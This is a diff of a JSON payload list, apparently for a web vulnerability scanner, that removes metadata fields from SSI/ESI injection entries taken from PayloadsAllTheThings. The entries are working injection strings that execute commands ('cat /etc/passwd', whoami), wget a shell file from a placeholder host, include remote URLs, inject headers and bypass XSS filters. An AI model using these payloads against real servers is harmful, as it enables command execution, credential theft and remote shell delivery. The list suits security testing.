-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"remote_addr\" -->"
   },
   {
     "id": "ssji-patt-0216",
     "name": "Ssi Esi #40",
     "template": "<!--#echo var=\"remote_host\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"remote_host\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"remote_host\" -->"
   },
   {
     "id": "ssji-patt-0217",
     "name": "Ssi Esi #41",
     "template": "<!--#echo var=\"remote_ident\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"remote_ident\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"remote_ident\" -->"
   },
   {
     "id": "ssji-patt-0218",
     "name": "Ssi Esi #42",
     "template": "<!--#echo var=\"remote_port\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"remote_port\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"remote_port\" -->"
   },
   {
     "id": "ssji-patt-0219",
     "name": "Ssi Esi #43",
     "template": "<!--#echo var=\"remote_user\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"remote_user\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"remote_user\" -->"
   },
   {
     "id": "ssji-patt-0220",
     "name": "Ssi Esi #44",
     "template": "<!--#echo var=\"request_method\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"request_method\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"request_method\" -->"
   },
   {
     "id": "ssji-patt-0221",
     "name": "Ssi Esi #45",
     "template": "<!--#echo var=\"request_uri\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"request_uri\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"request_uri\" -->"
   },
   {
     "id": "ssji-patt-0222",
     "name": "Ssi Esi #46",
     "template": "<!--#echo var=\"script_filename\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"script_filename\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"script_filename\" -->"
   },
   {
     "id": "ssji-patt-0223",
     "name": "Ssi Esi #47",
     "template": "<!--#echo var=\"script_name\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"script_name\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"script_name\" -->"
   },
   {
     "id": "ssji-patt-0224",
     "name": "Ssi Esi #48",
     "template": "<!--#echo var=\"script_uri\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"script_uri\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"script_uri\" -->"
   },
   {
     "id": "ssji-patt-0225",
     "name": "Ssi Esi #49",
     "template": "<!--#echo var=\"script_url\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"script_url\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"script_url\" -->"
   },
   {
     "id": "ssji-patt-0226",
     "name": "Ssi Esi #50",
     "template": "<!--#echo var=\"server_addr\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"server_addr\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"server_addr\" -->"
   },
   {
     "id": "ssji-patt-0227",
     "name": "Ssi Esi #51",
     "template": "<!--#echo var=\"server_admin\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"server_admin\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"server_admin\" -->"
   },
   {
     "id": "ssji-patt-0228",
     "name": "Ssi Esi #52",
     "template": "<!--#echo var=\"server_name -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"server_name -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"server_name -->"
   },
   {
     "id": "ssji-patt-0229",
     "name": "Ssi Esi #53",
     "template": "<!--#echo var=\"server_port\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"server_port\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"server_port\" -->"
   },
   {
     "id": "ssji-patt-0230",
     "name": "Ssi Esi #54",
     "template": "<!--#echo var=\"server_protocol\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"server_protocol\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"server_protocol\" -->"
   },
   {
     "id": "ssji-patt-0231",
     "name": "Ssi Esi #55",
     "template": "<!--#echo var=\"server_software\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"server_software\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"server_software\" -->"
   },
   {
     "id": "ssji-patt-0232",
     "name": "Ssi Esi #56",
     "template": "<!--#echo var=\"site_htmlroot\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"site_htmlroot\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"site_htmlroot\" -->"
   },
   {
     "id": "ssji-patt-0233",
     "name": "Ssi Esi #57",
     "template": "<!--#echo var=\"total_hits\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"total_hits\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"total_hits\" -->"
   },
   {
     "id": "ssji-patt-0234",
     "name": "Ssi Esi #58",
     "template": "<!--#echo var=\"tz\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"tz\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"tz\" -->"
   },
   {
     "id": "ssji-patt-0235",
     "name": "Ssi Esi #59",
     "template": "<!--#echo var=\"unique_id\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"unique_id\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"unique_id\" -->"
   },
   {
     "id": "ssji-patt-0236",
     "name": "Ssi Esi #60",
     "template": "<!--#echo var=\"user_name\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"user_name\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"user_name\" -->"
   },
   {
     "id": "ssji-patt-0237",
     "name": "Ssi Esi #61",
     "template": "<!--#exec cmd=\"/bin/ls /\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"/bin/ls /\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"/bin/ls /\" -->"
   },
   {
     "id": "ssji-patt-0238",
     "name": "Ssi Esi #62",
     "template": "<!--#exec cmd=\"cat /etc/passwd\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"cat /etc/passwd\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"cat /etc/passwd\" -->"
   },
   {
     "id": "ssji-patt-0239",
     "name": "Ssi Esi #63",
     "template": "<!--#exec cmd=\"cd C:\\WINDOWS\\System32\">",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"cd C:\\WINDOWS\\System32\">",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"cd C:\\WINDOWS\\System32\">"
   },
   {
     "id": "ssji-patt-0240",
     "name": "Ssi Esi #64",
     "template": "<!--#exec cmd=\"curl http://sn1persecurity.com/.testing/rfi_vuln.php\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"curl http://sn1persecurit...",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"curl http://sn1persecurit..."
   },
   {
     "id": "ssji-patt-0241",
     "name": "Ssi Esi #65",
     "template": "<!--#exec cmd=\"dir\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"dir\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"dir\" -->"
   },
   {
     "id": "ssji-patt-0242",
     "name": "Ssi Esi #66",
     "template": "<!--#exec cmd=\"ipconfig\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"ipconfig\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"ipconfig\" -->"
   },
   {
     "id": "ssji-patt-0243",
     "name": "Ssi Esi #67",
     "template": "<!--#exec cmd=\"ls\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"ls\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"ls\" -->"
   },
   {
     "id": "ssji-patt-0244",
     "name": "Ssi Esi #68",
     "template": "<!--#exec cmd=\"perl -e 'print \"X\"*5000'\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"perl -e 'print \"X\"*5000'\"...",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"perl -e 'print \"X\"*5000'\"..."
   },
   {
     "id": "ssji-patt-0245",
     "name": "Ssi Esi #69",
     "template": "<!--#exec cmd=\"sleep 10\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"sleep 10\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"sleep 10\" -->"
   },
   {
     "id": "ssji-patt-0246",
     "name": "Ssi Esi #70",
     "template": "<!--#exec cmd=\"sleep 5\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"sleep 5\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"sleep 5\" -->"
   },
   {
     "id": "ssji-patt-0247",
     "name": "Ssi Esi #71",
     "template": "<!--#exec cmd=\"uname\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"uname\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"uname\" -->"
   },
   {
     "id": "ssji-patt-0248",
     "name": "Ssi Esi #72",
     "template": "<!--#exec cmd=\"wget http://website.com/dir/shell.txt\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"wget http://website.com/d...",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"wget http://website.com/d..."
   },
   {
     "id": "ssji-patt-0249",
     "name": "Ssi Esi #73",
     "template": "<!--#exec cmd=\"whoami\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"whoami\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"whoami\" -->"
   },
   {
     "id": "ssji-patt-0250",
     "name": "Ssi Esi #74",
     "template": "<!--#exec cmd=\"whoami\"-->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"whoami\"-->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#exec cmd=\"whoami\"-->"
   },
   {
     "id": "ssji-patt-0251",
     "name": "Ssi Esi #75",
     "template": "<!--#flastmod virtual=\"echo.html\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#flastmod virtual=\"echo.html\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#flastmod virtual=\"echo.html\" -->"
   },
   {
     "id": "ssji-patt-0252",
     "name": "Ssi Esi #76",
     "template": "<!--#fsize file=\"ssi.shtml\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#fsize file=\"ssi.shtml\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#fsize file=\"ssi.shtml\" -->"
   },
   {
     "id": "ssji-patt-0253",
     "name": "Ssi Esi #77",
     "template": "<!--#include file=?UUUUUUUU...UU?-->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#include file=?UUUUUUUU...UU?-->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#include file=?UUUUUUUU...UU?-->"
   },
   {
     "id": "ssji-patt-0254",
     "name": "Ssi Esi #78",
     "template": "<!--#include virtual=\"/\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#include virtual=\"/\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#include virtual=\"/\" -->"
   },
   {
     "id": "ssji-patt-0255",
     "name": "Ssi Esi #79",
     "template": "<!--#include virtual=\"/index.html\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#include virtual=\"/index.html\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#include virtual=\"/index.html\" -->"
   },
   {
     "id": "ssji-patt-0256",
     "name": "Ssi Esi #80",
     "template": "<!--#include virtual=\"http://sn1persecurity.com/.testing/rfi_vuln.php\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#include virtual=\"http://sn1persecur...",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#include virtual=\"http://sn1persecur..."
   },
   {
     "id": "ssji-patt-0257",
     "name": "Ssi Esi #81",
     "template": "<!--#include virtual=\"https://crowdshield.com/.testing/rfi_vuln.php\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#include virtual=\"https://crowdshiel...",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#include virtual=\"https://crowdshiel..."
   },
   {
     "id": "ssji-patt-0258",
     "name": "Ssi Esi #82",
     "template": "<!--#printenv -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#printenv -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#printenv -->"
   },
   {
     "id": "ssji-patt-0259",
     "name": "Ssi Esi #83",
     "template": "</nowiki>",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: </nowiki>",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: </nowiki>"
   },
   {
     "id": "ssji-patt-0260",
     "name": "Ssi Esi #84",
     "template": "<esi:debug/>",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <esi:debug/>",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <esi:debug/>"
   },
   {
     "id": "ssji-patt-0261",
     "name": "Ssi Esi #85",
     "template": "<esi:include src=\"http://google.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/\"/>",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <esi:include src=\"http://google.com%0d%0...",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <esi:include src=\"http://google.com%0d%0..."
   },
   {
     "id": "ssji-patt-0262",
     "name": "Ssi Esi #86",
     "template": "<esi:include src=\"http://host/poc.xml\" dca=\"xslt\" stylesheet=\"http://google.com/poc.xsl\" />",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <esi:include src=\"http://host/poc.xml\" d...",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <esi:include src=\"http://host/poc.xml\" d..."
   },
   {
     "id": "ssji-patt-0263",
     "name": "Ssi Esi #87",
     "template": "<esi:include src=http://google.com/>",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <esi:include src=http://google.com/>",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <esi:include src=http://google.com/>"
   },
   {
     "id": "ssji-patt-0264",
     "name": "Ssi Esi #88",
     "template": "<pre><!--#echo var=\"DATE_LOCAL\" --> </pre>",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <pre><!--#echo var=\"DATE_LOCAL\" --> </pr...",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <pre><!--#echo var=\"DATE_LOCAL\" --> </pr..."
   },
   {
     "id": "ssji-patt-0265",
     "name": "Ssi Esi #89",
     "template": "<pre><!--#exec cmd=\"dir\" --></pre>",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <pre><!--#exec cmd=\"dir\" --></pre>",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <pre><!--#exec cmd=\"dir\" --></pre>"
   },
   {
     "id": "ssji-patt-0266",
     "name": "Ssi Esi #90",
     "template": "<pre><!--#exec cmd=\"ls\" --></pre>",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <pre><!--#exec cmd=\"ls\" --></pre>",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <pre><!--#exec cmd=\"ls\" --></pre>"
   },
   {
     "id": "ssji-patt-0267",
     "name": "Ssi Esi #91",
     "template": "<pre><!--#exec cmd=\"whoami\"--></pre>",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <pre><!--#exec cmd=\"whoami\"--></pre>",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <pre><!--#exec cmd=\"whoami\"--></pre>"
   },
   {
     "id": "ssji-patt-0268",
     "name": "Ssi Esi #92",
     "template": "x=<esi:assign name=\"var1\" value=\"'cript'\"/><s<esi:vars name=\"$(var1)\"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name=\"$(var1)\"/>>",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: x=<esi:assign name=\"var1\" value=\"'cript'...",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: x=<esi:assign name=\"var1\" value=\"'cript'..."
   }
 ]
